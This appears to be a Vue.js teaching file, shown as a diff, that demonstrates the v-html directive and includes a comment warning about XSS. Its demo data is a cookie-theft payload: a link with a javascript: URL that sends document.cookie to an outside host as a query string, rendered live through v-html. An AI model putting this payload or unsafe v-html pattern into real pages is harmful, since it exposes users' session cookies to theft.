@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="lib/vue.js"></script>
+</head>
+<body>
+    
+    <div id="box">
+        <!-- 不执行 html标签解析 -->
+        {{myhtml}}
+
+        <!-- 解析html 指令 -->
+        <div v-html="myhtml"></div>
+
+        <!-- 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。 -->
+    </div>
+
+    <script>
+        new Vue({
+            el:"#box",
+            data:{
+                myhtml:"<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>男人看了沉默</a>"
+            }
+        })
+    </script>
+</body>
+</html>
